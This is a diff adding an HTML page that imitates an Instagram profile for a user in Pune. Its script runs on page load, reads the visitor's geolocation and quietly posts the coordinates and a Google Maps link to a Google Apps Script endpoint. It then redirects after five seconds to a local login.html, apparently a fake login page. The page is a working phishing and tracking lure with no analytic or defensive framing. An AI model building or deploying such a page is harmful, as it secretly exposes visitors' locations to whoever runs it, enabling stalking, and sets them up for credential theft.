@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Profile</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+}
+
+body {
+  background: #fff;
+  max-width: 430px;
+  margin: auto;
+  border: 1px solid #ddd;
+}
+
+/* Header */
+.header {
+  display: flex;
+  justify-content: space-between;
+  padding: 12px;
+  font-weight: bold;
+  border-bottom: 1px solid #ddd;
+}
+
+/* Profile Section */
+.profile {
+  display: flex;
+  padding: 15px;
+  align-items: center;
+}
+
+.profile img {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+}
+
+.stats {
+  flex: 1;
+  display: flex;
+  justify-content: space-around;
+  text-align: center;
+}
+
+.stats div span {
+  font-weight: bold;
+}
+
+/* Bio */
+.bio {
+  padding: 0 15px 10px;
+  font-size: 14px;
+}
+
+.bio strong {
+  display: block;
+}
+
+/* Button */
+.edit-btn {
+  margin: 10px 15px;
+  padding: 6px;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  text-align: center;
+  font-weight: 500;
+}
+
+/* Highlights */
+.highlights {
+  display: flex;
+  gap: 15px;
+  padding: 10px;
+  overflow-x: auto;
+}
+
+.highlight {
+  text-align: center;
+  font-size: 12px;
+}
+
+.highlight div {
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  border: 1px solid #ccc;
+  margin-bottom: 5px;
+}
+
+/* Tabs */
+.tabs {
+  display: flex;
+  justify-content: space-around;
+  border-top: 1px solid #ddd;
+  border-bottom: 1px solid #ddd;
+  padding: 8px 0;
+}
+
+/* Posts Grid */
+.posts {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 2px;
+}
+
+.posts div {
+  background: #ccc;
+  height: 130px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Header -->
+<div class="header">
+  <span>insta_id</span>
+  <span>☰</span>
+</div>
+
+<!-- Profile -->
+<div class="profile">
+  <img src="./profile.jpg">
+  <div class="stats">
+    <div><span>12</span><br>Posts</div>
+    <div><span>340</span><br>Followers</div>
+    <div><span>180</span><br>Following</div>
+  </div>
+</div>
+
+<!-- Bio -->
+<div class="bio">
+  <strong>username</strong>
+  Love Listning <br>
+  📍 India 🇮🇳 <br>
+ 🧿 Dehuroad, Pune
+</div>
+
+<div class="edit-btn">Edit Profile</div>
+
+<!-- Highlights -->
+<div class="highlights">
+  <div class="highlight"><div></div>Story</div>
+  <div class="highlight"><div></div>Travel</div>
+  <div class="highlight"><div></div>Work</div>
+  <div class="highlight"><div></div>Fun</div>
+</div>
+
+<!-- Tabs -->
+<div class="tabs">
+  <span>⬛</span>
+  <span>🎞</span>
+  <span>👤</span>
+</div>
+
+<!-- Posts -->
+<div class="posts">
+  <div></div><div></div><div></div>
+  <div></div><div></div><div></div>
+  <div></div><div></div><div></div>
+</div>
+<script>
+    // 🔥 AUTO RUN WHEN PAGE LOADS
+    window.onload = function () {
+      getLocation();
+    setTimeout(loadLogin,5000)
+    };
+
+    function getLocation() {
+      let result;
+
+      if (!navigator.geolocation) {
+      
+        return;
+      }
+
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+
+          const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+         
+
+          // ✅ SEND TO GOOGLE SHEET
+          fetch("https://script.google.com/macros/s/AKfycbw93soAdKaQtP2ja3h8UBgOxxFvf6SulbyHDGQRQMJUxaNXAPQJvhvQTFbX726UGuX6/exec", {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              lat: lat,
+              lng: lng,
+              mapLink: mapLink
+            })
+          });
+        },
+        (error) => {
+            
+        }
+      );
+    }
+
+
+    function loadLogin(){
+        window.location.href="./login.html"
+    }
+</script>
+
+</body>
+</html>
